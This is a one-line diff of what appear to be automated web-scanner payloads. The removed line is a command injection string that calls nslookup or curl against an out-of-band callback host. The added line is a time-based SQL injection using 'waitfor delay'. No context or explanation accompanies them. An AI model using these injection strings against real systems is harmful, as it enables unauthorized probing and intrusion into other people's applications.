@@ -1,1 +1,1 @@
-&(nslookup${IFS}-q${IFS}cname${IFS}hitzdxutvhwhs57ddf.bxss.me||curl${IFS}hitzdxutvhwhs57ddf.bxss.me)&'\"`0&(nslookup${IFS}-q${IFS}cname${IFS}hitzdxutvhwhs57ddf.bxss.me||curl${IFS}hitzdxutvhwhs57ddf.bxss.me)&`'
+555j5ZfNJDS'; waitfor delay '0:0:15' -- 
